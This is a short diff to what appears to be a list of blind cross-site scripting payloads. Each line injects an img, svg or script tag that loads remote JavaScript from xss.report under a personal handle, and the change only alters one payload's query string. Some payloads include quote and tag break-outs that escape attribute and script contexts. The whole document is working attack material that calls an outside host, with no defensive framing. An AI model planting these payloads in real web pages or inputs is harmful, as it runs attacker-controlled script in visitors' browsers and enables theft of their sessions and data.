@@ -1,4 +1,4 @@
-<img/src/onerror=import('//xss.report/c/hnterx/');//>
+<img/src/onerror=import('//xss.report/c/hnterx?img');//>
 <svg/onload=import('//xss.report/c/hnterx')>
 '"><script src=https://xss.report/c/hnterx?1></script>
 ';"/></script><script/src=//xss.report/c/hnterx?66
